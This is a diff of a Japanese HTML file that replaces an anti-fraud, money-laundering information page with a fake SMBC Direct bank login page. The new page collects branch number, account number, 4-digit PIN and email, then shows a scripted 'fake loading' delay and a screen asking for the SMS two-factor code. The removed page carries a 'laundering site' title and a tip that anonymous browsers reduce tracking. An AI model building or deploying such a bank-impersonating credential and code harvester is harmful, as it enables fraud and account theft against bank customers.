@@ -1,109 +1,178 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>振込先ロンダリングサイト</title>
-  <link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SMBCダイレクトログイン</title>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Noto Sans JP', sans-serif;
+      margin: 0;
+      background: #f6f8f9;
+    }
+
+    header {
+      background-color: #006341;
+      color: white;
+      padding: 1rem;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 2rem auto;
+      background: white;
+      padding: 2rem;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      animation: slideIn 0.6s ease-out;
+    }
+
+    @keyframes slideIn {
+      from { transform: translateY(30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    label {
+      display: block;
+      margin-top: 1rem;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.8rem;
+      margin-top: 0.3rem;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      width: 100%;
+      background-color: #006341;
+      color: white;
+      padding: 0.9rem;
+      margin-top: 1.5rem;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+
+    button:hover {
+      background-color: #004d30;
+    }
+
+    .warning {
+      background-color: #fff3cd;
+      color: #856404;
+      padding: 1rem;
+      border-left: 5px solid #ffcc00;
+      margin-bottom: 1.5rem;
+      border-radius: 5px;
+      font-size: 0.95rem;
+    }
+
+    .spinner {
+      display: none;
+      margin-top: 1rem;
+      text-align: center;
+    }
+
+    .spinner div {
+      width: 18px;
+      height: 18px;
+      margin: 0 auto;
+      border: 3px solid #006341;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .auth-screen {
+      display: none;
+      text-align: center;
+      padding: 3rem 1rem;
+    }
+
+    .auth-screen input {
+      max-width: 200px;
+      text-align: center;
+      font-size: 1.2rem;
+      letter-spacing: 0.5rem;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 1rem;
+        padding: 1rem;
+      }
+    }
+  </style>
 </head>
 <body>
+
   <header>
-    <h1>振込先ロンダリングサイト</h1>
+    <h1>SMBCダイレクト ログイン</h1>
   </header>
-  
-  <main>
-    <section>
-      <h2>振込先番号確認ツール</h2>
-      <form id="checkForm">
-        <label for="bank">銀行名:</label>
-        <input type="text" id="bank" name="bank" required>
-        <label for="account">口座番号:</label>
-        <input type="text" id="account" name="account" required>
-        <button type="submit">確認</button>
-      </form>
-      <p id="result"></p>
-    </section>
 
-    <section>
-      <h2>マネーロンダリングとは</h2>
-      <article>
-        <h3>マネーロンダリングの概要</h3>
-        <p>マネーロンダリングとは、不正に得たお金を合法的に見せかけるために行われる一連の行為のことです。犯罪者は違法な手段で得たお金を「洗浄」することで、警察や監視機関の目を逃れようとします。例えば、振込先を使って不正に得た資金を他のアカウントに転送するなどの手法が取られます。</p>
-      </article>
-    </section>
+  <div class="container" id="loginForm">
+    <div class="warning">
+      ⚠️ ウイルス感染を装って050番号へ誘導する詐欺が急増中！ <br>
+      本物の連絡先は公式サイトから確認してください。
+    </div>
 
-    <section>
-  <h2>よくある質問</h2>
-  <dl>
-    <dt>振込先が本物か確認する方法は？</dt>
-    <dd>公式の連絡手段で銀行に確認するのが最も安全です。</dd>
+    <form id="form">
+      <label for="branch">店番号</label>
+      <input type="text" id="branch" required pattern="\d{3}" placeholder="例: 123" />
 
-    <dt>登録するとビットコイン50,000円分もらえるって本当？</dt>
-    <dd>一部のサイトでは、ウォレットアドレスを登録すると自動的にビットコインがもらえるとされています。これはよくある詐欺の手口で、情報を盗まれる危険があります。本FAQの内容は教育用のフィクションです。</dd>
+      <label for="account">口座番号</label>
+      <input type="text" id="account" required pattern="\d{7}" placeholder="例: 1234567" />
 
-    <dt>マネーロンダリングとは何ですか？</dt>
-    <dd>
-      マネーロンダリングとは、犯罪などで得た資金の出どころを隠し、正当な収入に見せかける行為です。一般的に3つの段階に分けられます：
-      <ol>
-        <li><strong>置換（Placement）</strong> - 現金を銀行などの金融機関に預ける段階。</li>
-        <li><strong>分散（Layering）</strong> - 資金の出所を分かりにくくするために、複数の取引や国際送金などを通して分散させる段階。</li>
-        <li><strong>統合（Integration）</strong> - 最終的に“正当な”資金として表に出す段階。</li>
-      </ol>
-    </dd>
+      <label for="password">ログイン暗証番号</label>
+      <input type="password" id="password" required pattern="\d{4}" placeholder="4桁の数字" />
 
-    <dt>情報を入力するとビットコインが入るって本当？</dt>
-    <dd>
-      一部の詐欺サイトでは、ウォレットアドレスを登録すると資金が入ると宣伝されていますが、これは信用してはいけません。こうした仕組みは実在しません。本FAQ内の記述は詐欺の手口を学ぶためのフィクションです。
-    </dd>
+      <label for="email">メールアドレス</label>
+      <input type="email" id="email" required placeholder="例: your@email.com" />
 
-    <dt>このサイトを使って大丈夫？</dt>
-    <dd>
-      braveなどの匿名性の高いブラウザを利用することで追跡リスクは下がる可能性がありますが、個人情報の取扱いについては慎重に判断してください。本サイトの内容は学習・教育目的のものであり、実際の取引を勧めるものではありません。
-    </dd>
-  </dl>
-</section>
+      <button type="submit">ログイン</button>
 
-    <section>
-      <h2>警告メッセージ</h2>
-      <div id="warningBanner" style="background-color: red; color: white; padding: 10px; text-align: center;">
-        <strong>警告！</strong> 振込先情報は必ず確認してください。疑わしい場合は、公式な連絡手段で確認しましょう。
-      </div>
-    </section>
+      <div class="spinner"><div></div><p>認証中...</p></div>
+    </form>
+  </div>
 
-    <section>
-      <h2>振込詐欺防止のための動画</h2>
-      <iframe width="560" height="315" src="https://www.youtube.com/embed/動画のID" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-    </section>
-
-    <section>
-      <h2>疑わしい振込先の例</h2>
-      <p>以下は振込先として疑わしい例です。個人名の口座や、公式名義でない振込先は注意が必要です。</p>
-      <ul>
-        <li>個人名の口座</li>
-        <li>公式名義ではない銀行名</li>
-        <li>急に振込先が変更された</li>
-      </ul>
-    </section>
-  </main>
-
-  <footer>
-    <p>&copy; 2025 振り込め詐欺防止団体</p>
-  </footer>
+  <div class="auth-screen" id="authScreen">
+    <h2>二段階認証コードを入力</h2>
+    <p>SMSに届いた6桁のコードを入力してください</p>
+    <input type="text" pattern="\d{6}" maxlength="6" placeholder="123456" />
+    <br><br>
+    <button onclick="alert('完了！');">認証して続行</button>
+  </div>
 
   <script>
-    document.getElementById('checkForm').addEventListener('submit', function(event) {
-      event.preventDefault();
-      const bank = document.getElementById('bank').value;
-      const account = document.getElementById('account').value;
-      const result = document.getElementById('result');
+    const form = document.getElementById('form');
+    const spinner = document.querySelector('.spinner');
+    const loginForm = document.getElementById('loginForm');
+    const authScreen = document.getElementById('authScreen');
 
-      // 仮の確認処理（実際のAPIやデータベースと連携する場合）
-      if (bank === '〇〇銀行' && account === '123-456-789') {
-        result.textContent = 'この振込先は正しい銀行です。';
-      } else {
-        result.textContent = '警告：この振込先は確認できませんでした。';
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      if (!form.checkValidity()) {
+        alert('すべての項目を正しく入力してください');
+        return;
       }
+
+      spinner.style.display = 'block';
+      setTimeout(() => {
+        loginForm.style.display = 'none';
+        authScreen.style.display = 'block';
+      }, 2000); // フェイクロード演出
     });
   </script>
+
 </body>
 </html>
